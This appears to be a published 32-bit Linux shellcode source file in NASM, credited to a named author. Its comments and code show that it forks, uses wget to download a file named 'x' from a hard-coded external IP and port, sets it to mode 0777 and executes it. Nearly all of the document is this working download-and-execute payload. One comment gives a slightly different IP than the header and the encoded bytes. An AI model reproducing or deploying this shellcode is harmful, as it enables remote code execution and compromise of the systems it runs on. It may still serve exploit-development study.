; Filename: downloadexec.nasm
; Author: Daniel Sauder
; Website: http://govolution.wordpress.com/
; Tested on: Ubuntu 12.04 / 32Bit
; License: http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode:
; - download 18.183.251.93:8080/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes

global _start

section .text

_start:
    ;fork
    xor eax,eax
    mov al,0x2
    int 0x80
    xor ebx,ebx
    cmp eax,ebx
    jz child
  
    ;wait(NULL)
    xor eax,eax
    mov al,0x7
    int 0x80
        
    ;chmod x
    xor ecx,ecx
    xor eax, eax
    push eax
    mov al, 0xf
    push 0x78
    mov ebx, esp
    xor ecx, ecx
    mov cx, 0x1ff
    int 0x80
    
    ;exec x
    xor eax, eax
    push eax
    push 0x78
    mov ebx, esp
    push eax
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 11
    int 0x80

child:
    ;download 18.183.215.93:8080/x with wget
    push 0xb
    pop eax
    cdq
    push edx

    push 0x782f3038   ; "x/08"
    push 0x30383a33   ; "08:3"
    push 0x392e3531   ; "9.51"
    push 0x322e3338   ; "2.38"
    push 0x312e3831   ; "1.81"
    mov ecx,esp
    push edx

    push 0x74         ; t
    push 0x6567772f   ; egw/
    push 0x6e69622f   ; nib/
    push 0x7273752f   ; rsu/
    mov ebx,esp
    push edx
    push ecx
    push ebx
    mov ecx,esp
    int 0x80